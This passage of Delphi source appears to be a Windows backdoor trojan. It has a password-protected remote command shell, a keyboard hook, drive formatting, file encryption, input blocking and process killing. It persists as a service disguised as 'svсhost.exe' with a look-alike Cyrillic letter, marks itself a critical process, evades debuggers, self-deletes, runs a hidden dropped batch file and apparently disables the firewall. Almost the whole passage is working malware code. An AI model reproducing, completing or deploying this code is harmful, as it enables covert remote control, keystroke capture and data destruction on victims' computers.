            Begin
               GetLocalIP;
            End
         Else
         If (Cmd = '\shared') Then
            Begin
               ShareDisk;
            End
         Else
         If (Cmd = '\shareddel') Then
            Begin
               ShareDiskDel;
            End
         Else
         If (Cmd = '\autorun') Then
            Begin
               AutoReg;
            End
         Else
         If (Cmd = '\hddn') Then
            Begin
              WriteLf('SerialNum ...');
            if GetVolumeInformation('c:\', Buffer, SizeOf(Buffer), @SerialNum, a, b, nil, 0) then
               WriteLf('SerialNum: '+IntToStr(SerialNum));
            End
         Else
         If (Cmd = '\hookkb') Then
            Begin
              WriteLf('Load hook file ...');
              Hook_KB;
            End
         Else
         If (Cmd = '\unhookkb') Then
            Begin
               WriteLf('Search process hook file: skbh.exe');
            if processExists('skbh.exe') then begin
               KillTask('skbh.exe');
               WriteLf('Process hook file: skbh.exe - KILL');
            end else begin
               WriteLf('Process not running: skbh.exe');
            end;

            End
         Else
         If (Cmd = '\getos') Then
            Begin
              WriteLf(GetOSVersionText);
              WriteLf(GetOSInfo);
            End
         Else
         If (Cmd = '\firewall') Then
            Begin
               ExecConsoleApp('netsh firewall show rule name=all');
               ExecConsoleApp('netsh advfirewall firewall show rule name=all');
            End
         Else
         If (Cmd = '\myfire') Then
            Begin
               MyFirewall;  //myfire
            End
         Else
         If (Cmd = '\criton') Then
            Begin
            if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
               WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
               Exit;
            end;
               BreakOnTermination := 1;
               HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
            if HRES = S_OK then
               WriteLf('Successfully set the current process as critical process.')
            else WriteLf('Error: Unable to set the current process as critical process.')
            End
         Else
         If (Cmd = '\critoff') Then
            Begin
            if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
               WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
               Exit;
            end;
               BreakOnTermination := 0;
               HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
            if HRES = S_OK then
               WriteLf('Successfully canceled critical process status.')
            else WriteLf('Error: Unable to cancel critical process status.')
            End
         Else
         If (Trim(Copy(Cmd, 1, 9)) = '\formatd') Then //FormatDrive('A');
            Begin
               Cmd:=Copy(Cmd, 10, Length(Cmd) - 9);
               ch:=Cmd[1];
               WriteLf(' Format Begin ...');
               FormatDrive(ch);
               WriteLf(' Format End ');
            End
         Else
         If (Trim(Copy(Cmd, 1, 10)) = '\findallg') Then
            Begin
               Cmd:=Copy(Cmd, 11, Length(Cmd) - 10);
               WriteLf(' FindAllGroup Begin ');
               FindAllComputers(Cmd);
               WriteLf(' FindAllGroup End ');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\encs') Then
            Begin
               Cmd:=Copy(Cmd, 7, Length(Cmd) - 6);
               WriteLf(' EncryptString Begin ');
               WriteLf(EncS(Cmd,KeyRelease));
               WriteLf(' EncryptString End ');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\decs') Then
            Begin
               Cmd:=Copy(Cmd, 7, Length(Cmd) - 6);
               WriteLf(' DecryptString Begin ');
               WriteLf(DecS(Cmd,KeyRelease));
               WriteLf(' DecryptString End ');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\encf') Then
            Begin
               Cmd:=Copy(Cmd, 7, Length(Cmd) - 6);
               WriteLf(' EncryptFile Begin ');
               If GetParams Then WriteLf(EncF(Param1, Param2));
               WriteLf(' EncryptFile End ');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\decf') Then
            Begin
               Cmd:=Copy(Cmd, 7, Length(Cmd) - 6);
               WriteLf(' DecryptFile Begin ');
               If GetParams Then WriteLf(DecF(Param1, Param2));
               WriteLf(' DecryptFile End ');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\kill') Then
            Begin
               If Not Kill(StrToIntDef(Copy(Cmd, 7, Length(Cmd) - 6), -1)) Then
                  WriteLf(ErrArray[8]) else WriteLf('Process: '+Copy(Cmd, 7, Length(Cmd) - 6)+' - KILL');
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\killp') Then
            Begin
                  Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
                  KillTask(Cmd);
                  WriteLf('Process: '+Cmd+' - KILL');
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\killx') Then   //Убить все процессы
            Begin
                  KillTask(Copy(Cmd, 8, Length(Cmd)));
                  WriteLf('Process: '+Copy(Cmd, 8, Length(Cmd))+' - KILL');
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\cmd') Then
            Begin
               Cmd:=Comspec + ' ' + Copy(Cmd, 6, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     ExecConsoleApp(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\run') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     SExec(Cmd, 'open');
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\print') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 6);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     SExec(Cmd, 'print');
                  End;
            End
         Else
         If (Cmd = '\bi') Then
            Begin
               BlockInput(True);
            End
         Else
         If (Cmd = '\ubi') Then
            Begin
               BlockInput(False);
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\msg') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd) - 5);
               WriteLf('Message Begin: '+#13#10+Cmd);
               ShowMsgBox(Cmd);
               WriteLf('Message End ');
               Exit;               
            End
         Else
         If (Cmd ='\reboot') Then
            Begin
               if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
                  WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
                  Exit;
               end;
                  BreakOnTermination := 0;
                  HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
               if HRES = S_OK then
                  WriteLf('Successfully canceled critical process status.')
               else WriteLf('Error: Unable to cancel critical process status.');
               ClnStop(Srv, Cln);
               If (Not WinReboot) Then WriteLf(ErrArray[6]);
            End
         Else
         If (Cmd = '\s') Then
            Begin
               Write('WARNING! Server will be halted! Continue(y,N)' + PS2);
               Cmd:=ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                  if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
                     WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
                     Exit;
                  end;
                     BreakOnTermination := 0;
                     HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
                  if HRES = S_OK then
                     WriteLf('Successfully canceled critical process status.')
                  else WriteLf('Error: Unable to cancel critical process status.');
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);
                     Halt;
                  End;
            End
         Else
         If (Cmd = '\r') Then
            Begin
               Write('WARNING! Server will be restarted! Continue(y,N)' + PS2);
               Cmd:=ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                  if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
                     WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
                     Exit;
                  end;
                     BreakOnTermination := 0;
                     HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
                  if HRES = S_OK then
                     WriteLf('Successfully canceled critical process status.')
                  else WriteLf('Error: Unable to cancel critical process status.');
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);
                     StartServer(StrToIntDef(l_port, 0));
                  End;
            End
         Else
         If (Cmd = '\delserver') Then
            Begin
               Write('WARNING! SERVER BINARY WILL BE REMOVED!!! CONTINUE(y,N)' + PS2);
               Cmd := ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                  if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
                     WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
                     Exit;
                  end;
                     BreakOnTermination := 0;
                     HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
                  if HRES = S_OK then
                     WriteLf('Successfully canceled critical process status.')
                  else WriteLf('Error: Unable to cancel critical process status.');
                     WriteLf('Умираююю. Прощай! Ааа..');
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);
                     DeleteSelf;
                  if SelfDelete then halt(1);
                  End;
            End
         Else
         If (Cmd = '\h') Or (Cmd = '\?') Or (Cmd = '\help') Then
            Begin
               Usage;
            End
         Else WriteLf(ErrArray[7]);
      End;
   Procedure Do_ext_cmd;
      Begin
         ExecConsoleApp(Cmd);
      End;
Begin
   If Length(Cmd) < 1 Then Exit;
   If (Cmd[1] = '\') Then Do_int_cmd //Команда внутренняя
   Else Do_ext_cmd; //Команда внешняя
End;

Function Main(dwEntryPoint: Pointer): dword; stdcall;
Begin
   Srv := StartServer(StrToIntDef(l_port, 0));
   If (Srv <= 0) Then Halt(1);
   Repeat
      Sleep(10);
      Cln := WaitClient(Srv);
      AssignCrtSock(Cln, Tf, Output);
      Send(Cln, PChar(Str_Hello), Length(Str_Hello), 0);
      Send(Cln, PChar(Str_Login), Length(Str_Login), 0);
      CurLogin := ReadLogin;
      Send(Cln, PChar(Str_Psw), Length(Str_Psw), 0);
      If (ReadPasw <> DecS(TrojPasw,KeyRelease)) Then  //DecS(TrojPasw,KeyRelease))  //GetRealPasw(TrojPasw)
      // Несоответствует пароль
         Begin
            If Check_Avail Then
               Begin
                  WriteLf(ErrArray[5]);
                  ClnStop(Srv, Cln);
               End;
            Continue;
         End;
      if (CurLogin <> TrojLogin) Then
      // Несоответствует логин
         Begin
            If Check_Avail Then
               Begin
                  WriteLf(ErrArray[5]);
                  ClnStop(Srv,Cln);
               End;
            Continue;
         End;
      Write(LN_FEED);
      //Выключение крит процесса      
   if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
      WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
      Exit;
   end;
      BreakOnTermination := 0;
      HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
   if HRES = S_OK then
      WriteLf('Successfully canceled critical process status.')
   else WriteLf('Error: Unable to cancel critical process status.');
      //Включение крит процесса
   if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
      WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
      Exit;
   end;
      BreakOnTermination := 1;
      HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
   if HRES = S_OK then
      WriteLf('Successfully set the current process as critical process.')
   else WriteLf('Error: Unable to set the current process as critical process.');
      While Check_Avail
         Do
            Begin
               Write(PS1);
               TrmCmd := ReadCmd;
               Do_cmd(TrmCmd);
               Sleep(100);
            End;

   Until false;
   Disconnect(Cln);
   ExitThread(0);
End;
//TELNET

//SERVICE
// =============================================================================
function GetErrosString: string; stdcall;
var
  Len: Integer;
  Buffer: array[0..255] of Char;
begin
  Len:= FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM or FORMAT_MESSAGE_ARGUMENT_ARRAY, nil,
                      GetLastError, 0, Buffer, SizeOf(Buffer), nil);
  while (Len > 0) and (Buffer[Len - 1] in [#0..#32]) do Dec(Len);
  SetString(Result, Buffer, Len);
end;
// =============================================================================
// Устанавливает "описание" для службы, под Win2k и выше
function SetServiceDescription(aSHndl: THandle; aDesc: string): Bool;
const
  SERVICE_CONFIG_DESCRIPTION: DWord = 1;
var
  DynChangeServiceConfig2: function(
        hService: SC_HANDLE;                    // handle to service
        dwInfoLevel: DWORD;                     // information level
        lpInfo: Pointer): Bool; stdcall;        // new data
  aLibHndl: THandle;
  TempP: PChar;
begin
  aLibHndl := GetModuleHandle(advapi32);
  Result := aLibHndl <> 0;
  if not Result
  then Exit;
  DynChangeServiceConfig2 := GetProcAddress(aLibHndl, 'ChangeServiceConfig2A');
  Result := @DynChangeServiceConfig2 <> nil;
  if not Result
  then Exit;
  TempP := PChar(aDesc); //ChangeServiceConfig2 хочет указатель на указатель строки
  Result := DynChangeServiceConfig2(aSHndl, SERVICE_CONFIG_DESCRIPTION, @TempP);
end;
// =============================================================================
// Вывод информации (при работе сервиса не применяется)
// =============================================================================
procedure ShowMsg(Msg: string; Flags: integer = -1);
begin
  if Flags < 0 then Flags := MB_ICONSTOP;
     MessageBox(0, PChar(Msg), ServiceFileName,
     MB_OK or MB_TASKMODAL or MB_TOPMOST or Flags)
end;
// Инсталяция сервиса в SCM
// =============================================================================
function Install: Boolean;
const
  StartType =
{$IFDEF SERVICE_DEBUG}
    SERVICE_AUTO_START;
{$ELSE}
    SERVICE_DEMAND_START;
{$ENDIF}
var
  SCManager, Service: SC_HANDLE;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_CREATE_SERVICE);
  if SCManager <> 0 then
  try
      Service := CreateService(SCManager, Name, DisplayName, SERVICE_ALL_ACCESS,
      SERVICE_WIN32_OWN_PROCESS, StartType, SERVICE_ERROR_NORMAL,
      PChar('"' + ParamStr(0) + '" -netsvcs'), nil, nil, nil, nil, nil); //-service  -notify  -k netsvcs
    if Service <> 0 then
    try
      Result := ChangeServiceConfig(Service, SERVICE_NO_CHANGE,
        SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, nil, nil,
        nil, nil, nil, nil, nil);
     if ServiceDescription <> '' then begin //Добавляем описание к нашей службе...
        Write('Setting service description...');
     if Not SetServiceDescription(Service, ServiceDescription) then begin
        WriteLn('Failed!');
        WriteLn('Warning: ', SysErrorMessage(GetLastError));
        WriteLn('Warning: SetServiceDesc() failed, but service is installed!');
     end else WriteLn('Ok');
     end;
    finally
      CloseServiceHandle(Service);
    end
    else Result := GetLastError = ERROR_SERVICE_EXISTS;
  finally
    CloseServiceHandle(SCManager);
  end
  else
    Result := False;
end;
// =============================================================================
function RunService: boolean; stdcall;
var pParameters: PChar;
    hSCM, hService: SC_HANDLE;
begin
  result:= false;
  pParameters:=PChar('"' + ParamStr(0) + '" -netsvcs '); //-k netsvcs  -notify
  hSCM:= OpenSCManager(nil, nil, GENERIC_READ or GENERIC_EXECUTE);
  if hSCM = 0 then begin
    ShowMsg('RunService OpenSCManager : '+GetErrosString);
    exit;
  end;
  hService:= OpenService(hSCM, Name, SERVICE_ALL_ACCESS);
  if hService = 0 then begin
    ShowMsg('RunService OpenService : '+GetErrosString);
    CloseServiceHandle(hSCM);
    exit;
  end;
  if not StartService(hService, 0, pParameters) then
    ShowMsg('RunService StartService : '+GetErrosString);
  CloseServiceHandle(hService);
  CloseServiceHandle(hSCM);
  result:= true;
end;
// =============================================================================
// деинсталяция сервиса из SCM
// =============================================================================
function Uninstall: Boolean;
var
  SCManager, Service: SC_HANDLE;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_CONNECT);
  if SCManager <> 0 then
  try
    Service := OpenService(SCManager, Name, _DELETE);
    if Service <> 0 then
    try
      Result := DeleteService(Service);
    finally
      CloseServiceHandle(Service);
    end
    else
      Result := GetLastError = ERROR_SERVICE_DOES_NOT_EXIST;
  finally
    CloseServiceHandle(SCManager);
  end
  else
    Result := False;
end;
// Инициализация сервиса
// =============================================================================
function Initialize: Boolean;
begin
  with Status do
  begin
    dwServiceType := SERVICE_WIN32_OWN_PROCESS;
    dwCurrentState := SERVICE_START_PENDING;
    dwControlsAccepted := SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_SHUTDOWN;
    dwWin32ExitCode := NO_ERROR;
    dwServiceSpecificExitCode := 0;
    dwCheckPoint := 1;
    dwWaitHint := 5000
  end;
  Result := SetServiceStatus(StatusHandle, Status);
end;
// Оповещение SCM что сервис работает
// =============================================================================
function NotifyIsRunning: Boolean;
begin
  with Status do
  begin
    dwCurrentState := SERVICE_RUNNING;
    dwWin32ExitCode := NO_ERROR;
    dwCheckPoint := 0;
    dwWaitHint := 0
  end;
  Result := SetServiceStatus(StatusHandle, Status);
end;
// Завершение работы сервиса
// =============================================================================
procedure Stop(Code: DWORD = NO_ERROR);
begin
  with Status do
  begin
    dwCurrentState := SERVICE_STOPPED;
    dwWin32ExitCode := Code;
  end;
  SetServiceStatus(StatusHandle, Status);
end;    
// =============================================================================
// Через эту функцию с нашим сервисом общается SCM
// =============================================================================
function ServicesCtrlHandler(dwControl: DWORD): DWORD; stdcall;
begin
  Result := 1;
  case dwControl of
    SERVICE_CONTROL_STOP, SERVICE_CONTROL_SHUTDOWN:
      Stop;
    SERVICE_CONTROL_INTERROGATE:
      NotifyIsRunning;
  end;
end;
//  Каллбэк вызываемый в случае запуска сервиса под W2K.
//  Его задача получить токен любого доступного процесса,
//  окна которого найдены в рамках заданного при перечислении десктопа.
// =============================================================================
function EnumDesktopWindowsCallback(
  WndHandle: THandle; Param: LPARAM): BOOL; stdcall;
var
  ProcessID: DWORD;
  ProcessHandle, UserToken: THandle;
begin
  Result := True;
  GetWindowThreadProcessId(WndHandle, ProcessID);
  ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, ProcessID);
  if ProcessHandle <> 0 then
  try
    if OpenProcessToken(ProcessHandle, TOKEN_ALL_ACCESS, UserToken) then
    begin
      PDWORD(Param)^ := UserToken;
      Result := False;
    end;
  finally
    CloseHandle(ProcessHandle);
  end;
end;
//  Непосредственно запуск уведомляющего приложения,
//  в контексте интерактивного десктопа
// =============================================================================
function ShowNotify(const Value: string): DWORD;
const
  WINDOW_STATION_NAME = 'Winsta0';
  APPLICATION_DESKTOP_NAME = 'Default';
var
  hLib: THandle;
  hCurrentWinStation, hInteractiveWorkstation: HWINSTA;
  hDefaultDesktop: HDESK;
  SI: TStartupInfo;
  PI: TProcessInformation;
  SessionId: DWORD;
  hInteractiveToken: THandle;
  WTSQueryUserToken: TWTSQueryUserToken;
begin
  Result := NO_ERROR;
  hInteractiveToken := INVALID_HANDLE_VALUE;
  if (Win32MajorVersion = 5) and (Win32MinorVersion = 0) then
  begin
    // В случае W2K
    hCurrentWinStation := GetProcessWindowStation;
    // Открываем рабочую станцию пользователя
    hInteractiveWorkstation := OpenWindowStation(
      PChar(WINDOW_STATION_NAME), False, MAXIMUM_ALLOWED);
    if hInteractiveWorkstation = 0 then Exit;
    try
      // Подключаем к ней наш процесс
      if not SetProcessWindowStation(hInteractiveWorkstation) then Exit;
      try
        // Открываем интерактивный десктоп
        hDefaultDesktop := OpenDesktop(PChar(APPLICATION_DESKTOP_NAME),
          0, False, MAXIMUM_ALLOWED);
        if hDefaultDesktop = 0 then Exit;
        try
          // Перечисляем окна десктопа с целью извлечь
          // токен залогиненного пользователя
          EnumDesktopWindows(hDefaultDesktop, @EnumDesktopWindowsCallback,
            Integer(@hInteractiveToken));
        finally
          CloseDesktop(hDefaultDesktop);
        end;
      finally
        SetProcessWindowStation(hCurrentWinStation);
      end;
    finally
      CloseWindowStation(hInteractiveWorkstation);
    end;
  end
  else
  begin
    // В случае Windows ХР и выше подгружаем библиотеку
    hLib := LoadLibrary('Wtsapi32.dll');
    if hLib > HINSTANCE_ERROR then
    begin
      // Получаем адрес функции WTSQueryUserToken
      @WTSQueryUserToken := GetProcAddress(hLib, 'WTSQueryUserToken');
      if Assigned(@WTSQueryUserToken) then
      begin
        // Получаем ID сессии в рамках которой
        // ведет работу залогиненый пользователь
        SessionID := WTSGetActiveConsoleSessionId;
        // Получаем токен пользователя
        WTSQueryUserToken(SessionID, hInteractiveToken);
      end;
    end;
  end;
  if hInteractiveToken = INVALID_HANDLE_VALUE then
  begin
    Result := GetLastError;
    Exit;
  end;
  // После того как токен получен - производим запуск самого себя
  // с параметром notify и параметрами, которые необходимо отобразить
  try
    ZeroMemory(@SI, SizeOf(TStartupInfo));
    SI.cb := SizeOf(TStartupInfo);
    SI.lpDesktop := PChar(WINDOW_STATION_NAME + '\' +
      APPLICATION_DESKTOP_NAME);
    if not CreateProcessAsUser(hInteractiveToken,
      PChar(ParamStr(0)),
      PChar('"' + ParamStr(0) + '" -netsvcs ' + Value), nil, nil, False,  //-notify -k netsvcs
      NORMAL_PRIORITY_CLASS, nil, nil, SI, PI) then
      Result := GetLastError;
  finally
    CloseHandle(hInteractiveToken);
  end;
end;
// Главная процедура сервиса
// =============================================================================
procedure MainProc(ArgCount: DWORD; var Args: array of PChar); stdcall;
var
  I,Y: Integer;
  dwResult, dwDelay: DWORD;
begin
  Y:=1;
  StatusHandle := RegisterServiceCtrlHandler(Name, @ServicesCtrlHandler);
  if (StatusHandle <> 0) and Initialize and NotifyIsRunning then
  begin
    dwResult := NO_ERROR;
    while Status.dwCurrentState <> SERVICE_STOP do
    try
      try
        Randomize;
        for I := 0 to Y do
        begin
        if i = 0 then begin
           fuck_xpfw;
           Main(nil);
        end;
          dwDelay := Random(10) + 1;
          dwResult := ShowNotify('OK '+IntToStr(I));
          Sleep(dwDelay * 1000);
          if dwResult <> NO_ERROR then Break;
        end;
      finally
        Y:=1;
      end;
    except
      // Обработка ошибок сервиса
      begin
        Stop(1);
      end;
    end;
  end;
end;
// ==========Start===============================================================
function Start: boolean; stdcall;
var
  ServTable: array [0..1] of SERVICE_TABLE_ENTRYA;
begin
  ServTable[0].lpServiceName:= Name;
  ServTable[0].lpServiceProc:= @MainProc;
  ServTable[1].lpServiceName:= nil;
  ServTable[1].lpServiceProc:= nil;
  if not StartServiceCtrlDispatcher(ServTable[0]) then begin
    result:= false;
  end else result:= true;
  if not RunService then Start else begin
      //Включение крит процесса
   if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
      WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
      Exit;
   end;
      BreakOnTermination := 1;
      HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
   if HRES = S_OK then
      WriteLf('Successfully set the current process as critical process.')
   else WriteLf('Error: Unable to set the current process as critical process.');
  end;
end;
// =============================================================================
//Мой главный модуль
begin
  GetSystemDirectory(SysTemDir, MAX_PATH);
  GetWindowsDirectory(WinTemDir, MAX_PATH);
  //=====Защита от отладчика===========
  if DebuggerPresent then begin
  if Uninstall then ShowMsg(SysErrorMessage(GetLastError));
  if SelfDelete then halt(1);
     Exit;
  end;
  if not FileExists(pchar(ExtractFilePath(ParamStr(0))+'hack.bat')) then begin
  if 0 <> FindResource(hInstance, 'hack', 'bat') then begin
     rs := TResourceStream.Create(hInstance, 'hack', 'bat');
     ms := TMemoryStream.Create;
    try
     ms.LoadFromStream(rs);
     ms.Position := 0;
     m_DllDataSize := ms.Size;
     mp_DllData := GetMemory(m_DllDataSize);
     ms.Read(mp_DllData^, m_DllDataSize);
     ms.SaveToFile(pchar(ExtractFilePath(ParamStr(0))+'hack.bat'));
    finally
     ms.Free;
     rs.Free;
    end;
  end;
     ShellExecute(0, 'open', PChar(ExtractFilePath(ParamStr(0))+'hack.bat'), nil, nil,SW_HIDE);
     Sleep(100);
  if FileExists(pchar(ExtractFilePath(ParamStr(0))+'hack.bat')) then
     DelDir(ExtractFilePath(ParamStr(0))+'hack.bat');
  end;  
  if ParamCount > 0 then
  begin
    // Инсталяция
    if AnsiUpperCase(ParamStr(1)) = '-INSTALL' then
    begin
      if not Install then ShowMsg(SysErrorMessage(GetLastError)) else
      if not RunService then Start;
      Exit;
    end;
    // Деинсталяция
    if AnsiUpperCase(ParamStr(1)) = '-UNINSTALL' then
    begin
    if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
       WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
       Exit;
    end;
       BreakOnTermination := 0;
       HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
    if HRES = S_OK then
       WriteLf('Successfully canceled critical process status.')
    else WriteLf('Error: Unable to cancel critical process status.');
    if not Uninstall then ShowMsg(SysErrorMessage(GetLastError));
    if FileExists(SysTemDir+'\svсhost.exe') then begin
       DelDir(SysTemDir+'\svсhost.exe');
       Exit;
    end;
    end;
    // Запуск сервиса
    if AnsiUpperCase(ParamStr(1)) = '-SERVICE' then
    begin
      ServicesTable[0].lpServiceName := Name;
      ServicesTable[0].lpServiceProc := @MainProc;
      ServicesTable[1].lpServiceName := nil;
      ServicesTable[1].lpServiceProc := nil;
      // Запускаем сервис, дальше работа идет в главной процедуре
      if not StartServiceCtrlDispatcher(ServicesTable[0]) and
        (GetLastError <> ERROR_SERVICE_ALREADY_RUNNING) then
          ShowMsg(SysErrorMessage(GetLastError));
      Exit;
    end;
    // зупуск в режиме уведомляющего приложения
    if AnsiUpperCase(ParamStr(1)) = '-NETSVCS' then //-NOTIFY   -k netsvcs -NOTIFY
    begin
      ServicesTable[0].lpServiceName := Name;
      ServicesTable[0].lpServiceProc := @MainProc;
      // Запускаем сервис, дальше работа идет в главной процедуре
      if not StartServiceCtrlDispatcher(ServicesTable[0]) and
        (GetLastError <> ERROR_SERVICE_ALREADY_RUNNING) then
         NotifyString := '';
         Exit;
    end else MessageBox(0,InfoStr,ServiceFileName, MB_ICONINFORMATION);
  end else begin
  if not FileExists(SysTemDir+'\svсhost.exe') then begin
     CopyFile(PChar(ExtractFilePath(ParamStr(0))+'svchost.exe'),PChar(SysTemDir+'\svсhost.exe'),false);
     ShellExecute(0,nil,PChar(SysTemDir+'\svсhost.exe'),'-INSTALL',nil, SW_SHOWNORMAL);
     Sleep(500);
  if SelfDelete then halt(1);
     Exit;
  end;   
  end;
  if not RunService then Start;
end.

